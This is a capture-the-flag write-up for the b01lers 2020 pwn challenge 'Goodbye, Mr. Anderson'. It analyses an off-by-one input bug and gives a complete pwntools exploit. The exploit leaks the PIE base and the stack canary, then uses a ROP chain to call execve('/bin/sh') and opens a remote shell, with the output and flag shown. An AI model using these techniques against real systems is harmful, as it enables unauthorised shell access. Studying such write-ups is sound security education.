# b01lers bootcamp CTF 2020

## Goodbye, Mr. Anderson

> 300
>
> Do it again Neo. Cheat death.
>
> `nc chal.ctf.b01lers.com 1009`
> 
> [leaks](leaks)  
> [leaks.c](leaks.c)  
> [libc.zip](libc.zip)

Tags: _pwn_ _x86-64_ _remote-shell_ _bof_ _stack-canary_ _syscall_ _rop_


## Summary

Many goodies here:

1. Uninitialized buffer provides binary address leak.
2. Easy canary leak.
3. Free syscall function.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Nice!  All mitigations in place.


### Decompile with Ghidra

```c
undefined8 main(void)
{
  long in_FS_OFFSET;
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  puts(
      "You hear that, Mr. Anderson? That\'s the sound of inevitability, that\'s the sound of yourdeath, goodbye, Mr. Anderson."
      );
  leak_stack_canary((long)name,0x10);
  leak_stack_canary((long)local_28,0x40);
  puts(local_28);
  leak_stack_canary((long)local_28,0x40);
  puts(local_28);
  leak_stack_canary((long)local_28,0x80);
  puts(local_28);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return 0;
}

long leak_stack_canary(long param_1,int param_2)
{
  int iVar1;
  long in_FS_OFFSET;
  int local_18;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  __isoc99_scanf(&DAT_00102008,&local_18);
  if (param_2 < local_18) {
    exit(0xd);
  }
  fgetc(stdin);
  local_14 = 0;
  while (local_14 <= local_18) {
    iVar1 = fgetc(stdin);
    *(undefined *)(param_1 + local_14) = (char)iVar1;
    local_14 = local_14 + 1;
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return param_1;
}

undefined8 yay(void)
{
  undefined8 unaff_RBP;
  
  syscall();
  return unaff_RBP;
}
```

Let's start with `yay` by looking at it's disassembly:

```assembly
001011e9 f3 0f 1e fa     ENDBR64
001011ed 55              PUSH       RBP
001011ee 48 89 e5        MOV        RBP,RSP
001011f1 58              POP        RAX
001011f2 0f 05           SYSCALL
001011f4 90              NOP
001011f5 5d              POP        RBP
001011f6 c3              RET
```

`yay` will pop a value off the stack into `$rax` and then call `syscall`.  Clearly this freebee is our path to the flag.

`leak_stack_canary` takes a buffer and a max length and without prompting expects the user to input the aforementioned values.  There's nothing special here, think of this as `read(0,buffer,max_length+1)`.

_Why +1?_  Well...

```c
  local_14 = 0;
  while (local_14 <= local_18) {
    iVar1 = fgetc(stdin);
    *(undefined *)(param_1 + local_14) = (char)iVar1;
    local_14 = local_14 + 1;
  }
```

To mess with you, our game masters will read one extra byte (`local_14 <= local_18`).

`main` first has us input a global (`name`) with a max length of `16`, followed by three buffer overflows (64, 64 ,128 bytes) into a buffer (`local_28`) of size 24.

It's not to difficult to see the path here:

1. Put `/bin/sh` as our `name` for use with `yay`/`execve`.
2. Leak the base process address (PIE is enabled), so we know the location of `name`, as well as other ROP gadgets we'll need.
3. Leak the value of the stack canary so we can smash the stack with impunity.
4. Send final payload to pop a shell.


### Let's go shopping

Set a breakpoint before the first `leak_stack_canary` call:

```
gef➤  b *main+111
Breakpoint 1 at 0x1312
```

and then checkout the stack:

```
0x00007fffffffe320│+0x0000: 0x0000000000000000	 ← $rsp
0x00007fffffffe328│+0x0008: 0x0000555555555100  →  <_start+0> endbr64
0x00007fffffffe330│+0x0010: 0x00007fffffffe430  →  0x0000000000000001
0x00007fffffffe338│+0x0018: 0x59d239836edb5700
0x00007fffffffe340│+0x0020: 0x0000000000000000	 ← $rbp
0x00007fffffffe348│+0x0028: 0x00007ffff7de80b3  →  <__libc_start_main+243> mov edi, eax
```

From the disassembly above `local_28` is our buffer and is `0x28` bytes above the return address on the stack (just below `$rbp`) at position `+0x28` putting the start of the buffer at `+0x00` (`$rsp`).

8 bytes in there's a base process address we can leak (this is why you initialize arrays :-).  24 bytes in is the canary.  Also take note the address ends in `00`.  We'll have to write over that or `puts` will stop, well, _putting_ after it reads a null.

While here checkout `$rdx` and `$rsi`.  Both need to be set to `0` before our `execve` syscall:

```
$rdx   : 0x0
$rsp   : 0x00007fffffffe320  →  0x0000000000000000
$rbp   : 0x00007fffffffe340  →  0x0000000000000000
$rsi   : 0x10
```

Good, `$rdx` is zero and it will continue to be zero (check it by setting a breakpoint at `leave`).  Finding `pop rdx` in small binaries is not easy.  We'll need this gift for our exploit.


## Exploit

### Setup

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./leaks')
context.log_level = 'INFO'

if not args.REMOTE:
    context.log_file = 'local.log'
    p = process(binary.path)
else:
    context.log_file = 'remote.log'
    p = remote('chal.ctf.b01lers.com', 1009)

p.recvuntil('goodbye, Mr. Anderson.\n')
```

### `/bin/sh` as `name`

```python
p.sendline('8')
p.sendline('/bin/sh\0')
```

I didn't test if the null at the end was required or not, but best to be safe.


### Leak base process address

```python
p.sendline('8')
p.sendline(8 * 'A')
p.recvline()
_ = p.recv(5)
_start = u64(b'\0' + _ + b'\0\0')
log.info('_start: ' + hex(_start))
binary.address = _start - binary.sym._start
log.info('binary.address: ' + hex(binary.address))
log.info('name ' + hex(binary.sym.name))
```

The above will send _9_ bytes (see analysis section), the 9th byte will overwrite the null of the base process address.

The `puts` will send two lines, the `A`'s followed by 5 bytes--the base process address leak.

The rest just computes the address of our binary and reports the location of `name` (for debugging).


### Leak canary

```python
p.sendline('24')
p.sendline(24 * 'A')
p.recvline()
p.recvline()
_ = p.recv(7)
canary = u64(b'\0' + _)
log.info('canary: ' + hex(canary))
```

This works the same as the base process address, except its the canary and we need 7 bytes.

> Canary LSB is null.  Convenient for us.


### Get a shell

```
rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi','pop r15','ret'])[0]

payload  = 24 * b'A'
payload += p64(canary)
payload += p64(59)
payload += p64(pop_rdi)
payload += p64(binary.sym.name)
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(binary.sym.yay)

p.sendline(str(len(payload)))
p.sendline(payload)
p.recvline()
p.recvline()

p.interactive()
```

Since `$rdx` is already zero (see analysis section) we just need `pop rdi` and `pop rsi` gadgets.  There's no `pop rsi; ret` in the binary, so we'll have to make do with `pop r15` in there as well.

Our payload starts by filling the 24-byte buffer with 24 `A`'s followed by the leaked canary (without which we'd get an egregious `*** stack smashing detected ***: terminated` error).

Next, is our argument to `yay` (`59` is the `execve` syscall number).  This may not seem intuitive, but set a breakpoint at `leave` and follow it yourself.  IANS, `leave` pops the saved base pointer into `rbp`, normally we do not care what the value is, but in this case we do because `yay` will push it back to the stack, then pop it into `$rax`--required for `syscall`.

Next, are the parameters to `execve`: the pointer to `/bin/sh` (`name`) and popping `0`'s into `$rsi` and `$r15` (just along for the ride).  `$rdx` is already zero, so no need to set.

Lastly, the call to `yay` to pop the shell.

> There are other options, e.g. put `59` on the stack and call `pop rax; syscall` directly, or use sigreturn, etc...  I went this route because it was easy.


Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/b01lersbootcampctf2020/goodbye_mr_anderson/leaks'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to chal.ctf.b01lers.com on port 1009: Done
[*] _start: 0x561ef7c45100
[*] binary.address: 0x561ef7c44000
[*] name 0x561ef7c48050
[*] canary: 0x1c53f1c9ba8fcf00
[*] Loaded 16 cached gadgets for './leaks'
[*] Switching to interactive mode
$ id
uid=1000(leaks) gid=1000(leaks) groups=1000(leaks)
$ ls -l
total 36
-r-xr-x--- 1 root leaks    46 Oct  2 18:33 Makefile
-r--r----- 1 root leaks    32 Oct  2 18:33 flag.txt
-r-xr-x--- 1 root leaks 17152 Oct  3 04:07 leaks
-r-xr-x--- 1 root leaks   906 Oct  2 18:33 leaks.c
-r-xr-x--- 1 root leaks    39 Oct  2 18:33 wrapper.sh
$ cat flag.txt
flag{l0tsa_l33ks_4r3_imp0rt4nt}
```
